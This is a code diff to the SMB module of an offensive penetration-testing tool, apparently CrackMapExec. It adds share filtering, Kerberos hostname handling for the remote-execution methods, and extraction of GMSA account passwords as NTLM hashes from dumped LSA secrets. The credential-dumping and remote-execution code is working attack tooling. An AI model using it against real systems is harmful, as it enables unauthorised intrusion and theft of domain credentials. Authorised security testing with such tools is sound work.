@@ -183,6 +183,7 @@ class smb(connection):
 
         egroup = smb_parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
         egroup.add_argument("--shares", action="store_true", help="enumerate shares and access")
+        egroup.add_argument("--filter-shares", nargs='+', help="Filter share by access, option 'read' 'write' or 'read,write'")
         egroup.add_argument("--sessions", action='store_true', help='enumerate active sessions')
         egroup.add_argument('--disks', action='store_true', help='enumerate disks')
         egroup.add_argument("--loggedon-users-filter",action='store',help='only search for specific user, works with regex')
@@ -638,7 +639,7 @@ class smb(connection):
 
             if method == 'wmiexec':
                 try:
-                    exec_method = WMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.kerberos, self.aesKey, self.kdcHost, self.hash, self.args.share)
+                    exec_method = WMIEXEC(self.host if not self.kerberos else self.hostname + '.' + self.domain, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.kerberos, self.aesKey, self.kdcHost, self.hash, self.args.share)
                     logging.debug('Executed command via wmiexec')
                     break
                 except:
@@ -648,7 +649,7 @@ class smb(connection):
 
             elif method == 'mmcexec':
                 try:
-                    exec_method = MMCEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash)
+                    exec_method = MMCEXEC(self.host if not self.kerberos else self.hostname + '.' + self.domain, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash)
                     logging.debug('Executed command via mmcexec')
                     break
                 except:
@@ -658,7 +659,7 @@ class smb(connection):
 
             elif method == 'atexec':
                 try:
-                    exec_method = TSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.kerberos, self.aesKey, self.kdcHost, self.hash) #self.args.share)
+                    exec_method = TSCH_EXEC(self.host if not self.kerberos else self.hostname + '.' + self.domain, self.smb_share_name, self.username, self.password, self.domain, self.kerberos, self.aesKey, self.kdcHost, self.hash) #self.args.share)
                     logging.debug('Executed command via atexec')
                     break
                 except:
@@ -668,7 +669,7 @@ class smb(connection):
 
             elif method == 'smbexec':
                 try:
-                    exec_method = SMBEXEC(self.host, self.smb_share_name, self.conn, self.args.port, self.username, self.password, self.domain, self.kerberos, self.aesKey, self.kdcHost, self.hash, self.args.share)
+                    exec_method = SMBEXEC(self.host if not self.kerberos else self.hostname + '.' + self.domain, self.smb_share_name, self.conn, self.args.port, self.username, self.password, self.domain, self.kerberos, self.aesKey, self.kdcHost, self.hash, self.args.share)
                     logging.debug('Executed command via smbexec')
                     break
                 except:
@@ -762,6 +763,8 @@ class smb(connection):
                 remark = share['remark']
                 perms  = share['access']
 
+                if self.args.filter_shares and self.args.filter_shares != perms:
+                    continue
                 self.logger.highlight(u'{:<15} {:<15} {}'.format(name, ','.join(perms), remark))
         except Exception as e:
             error = get_error_string(e)
@@ -1301,6 +1304,16 @@ class smb(connection):
         def add_lsa_secret(secret):
             add_lsa_secret.secrets += 1
             self.logger.highlight(secret)
+            if "_SC_GMSA_{84A78B8C" in secret:
+                gmsa_id = secret.split("_")[4].split(":")[0]
+                data = bytes.fromhex(secret.split("_")[4].split(":")[1])
+                blob = MSDS_MANAGEDPASSWORD_BLOB()
+                blob.fromString(data)
+                currentPassword = blob['CurrentPassword'][:-2]
+                ntlm_hash = MD4.new ()
+                ntlm_hash.update (currentPassword)
+                passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
+                self.logger.highlight("GMSA ID: {:<20} NTLM: {}".format(gmsa_id, passwd))
         add_lsa_secret.secrets = 0
 
         if self.remote_ops and self.bootkey:
@@ -1390,7 +1403,7 @@ class smb(connection):
             NTDS.dump()
             self.logger.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), self.output_filename + '.ntds', highlight(add_ntds_hash.added_to_db)))
             self.logger.info("To extract only enabled accounts from the output file, run the following command: ")
-            self.logger.info("cat {} | grep -iv disabled | cut -d ':' -f1".format(self.output_filename + '.ntds'))
+            self.logger.info("grep -iv disabled {} | cut -d ':' -f1".format(self.output_filename + '.ntds'))
         except Exception as e:
             #if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                 # We don't store the resume file if this error happened, since this error is related to lack
